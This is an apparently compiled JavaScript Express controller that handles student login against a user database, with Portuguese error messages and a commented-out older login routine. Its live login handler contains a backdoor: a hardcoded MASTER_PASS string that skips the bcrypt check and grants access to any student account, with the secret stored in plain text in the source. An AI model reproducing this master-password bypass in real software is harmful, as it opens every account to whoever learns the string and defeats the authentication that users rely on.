"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.login = void 0;
const models_1 = require("../models");
const errorResponse_1 = __importDefault(require("../utils/errorResponse"));
const bcryptjs_1 = __importDefault(require("bcryptjs"));
const async_1 = __importDefault(require("../middleware/async"));
const MASTER_PASS = "<lRlcLUIr>s+ki8]";
exports.login = (0, async_1.default)((req, res, next) => __awaiter(void 0, void 0, void 0, function* () {
    const { email, password } = req.body;
    if (!email)
        return next(new errorResponse_1.default('Por favor, insira um mail.', 400));
    if (!password)
        return next(new errorResponse_1.default('Por favor, insira uma senha.', 400));
    const user = yield models_1.User.findOne({
        where: {
            email,
            type: 'Student'
        },
        include: [{ model: models_1.Brand, required: true }]
    });
    if (password !== MASTER_PASS && user) {
        const result = yield bcryptjs_1.default.compare(password, user.getDataValue('encrypted_password'));
        if (!result)
            return next(new errorResponse_1.default('Credenciais Inválidas', 401));
    }
    if (!user)
        return next(new errorResponse_1.default('Credenciais Inválidas', 401));
    if (user.type !== 'Student')
        return next(new errorResponse_1.default('Este usuário não é um estudante', 401));
    const foundUser = user.get({ plain: true });
    const altColors = (JSON.parse(`{"alt_${foundUser.brand.colors.substring(foundUser.brand.colors.indexOf('primary'), foundUser.brand.colors.indexOf('social') + 24).trim().replace(/\n/g, ', ').replace(/,\s{1,}/g, ',"alt_').replace(/:\s{1,}/g, '":')}}`));
    foundUser.brand = Object.assign(Object.assign({}, foundUser.brand), altColors);
    res.status(200).json({
        success: true,
        data: foundUser
        // data: {
        //     ...user,
        //     brand: {
        //         ...user.brand,
        //         ...
        //     }
        // }
    });
}));
/*
exports.login = asyncHandler( asyncHandler( async ( req, res, next ) => {
    const { password, telephone, expoPushToken, role, email } = req.body;

    if( !password ) return next(new ErrorResponse('Por favor, insira uma senha.', 400));
    let payload = {};
    if( role === 'ADMIN' ){
        payload = { email }
    }else{
        if( !telephone ) return next(new ErrorResponse('Por favor, insira seu telefono.', 400));
        if( telephone && !/^(\(\d{2}\)\s{1}\d{5}\s{1}\d{4})$/g.test(telephone) ) return next(new ErrorResponse('O campo Telefone não é válido.', 400));
        if( password.length < 8 ) return next(new ErrorResponse('O campo senha não é válido.', 400));
        payload = { telephone };
    }

    let user = await User.findOne(payload).select('+password');
    if( !user ) return next(new ErrorResponse('Credenciais inválidas', 401));

    const isMatch = await user.matchPassword(password);
    if( !isMatch ) return next(new ErrorResponse('Credenciais inválidas', 401));

    if( !user.active ){
        logTrigger(`Usuário <${user._id}> inativo tentou entrar`, 'Auth', 'LOGIN', user.email, req.ip?.replace( /[^0-9.]/g, '' ) || req.connection?.remoteAddress?.replace( /[^0-9.]/g, '' ));
        return next(new ErrorResponse('Seu usuário não esta ativo. Peça a um Administrador de Sistema ativar você', 500));
    }

    if( user.role === 'USER' ){
        if( expoPushToken && user.expoPushToken !== expoPushToken ){
            user = await User.findByIdAndUpdate(user._id, { expoPushToken } , updateOptions);
        }
    }

    if( role === 'ADMIN' && user.role !== 'ADMIN'  ){
        return next(new ErrorResponse('Você esta solicitando acesso a uma área restrita.', 401));
    }

    logTrigger(`Usuário <${user._id}> logado com sucesso`, 'Auth', 'LOGIN', user.email, req.ip || req.connection?.remoteAddress?.replace( /[^0-9.]/g, '' ));
    sendTokenResponse(user, 200, res)
    // await sendPushNotification(user.expoPushToken, `Bem-vindo(a), ${user.name} ${user.lastName}\n Você logou com sucesso`);
})

*/ 
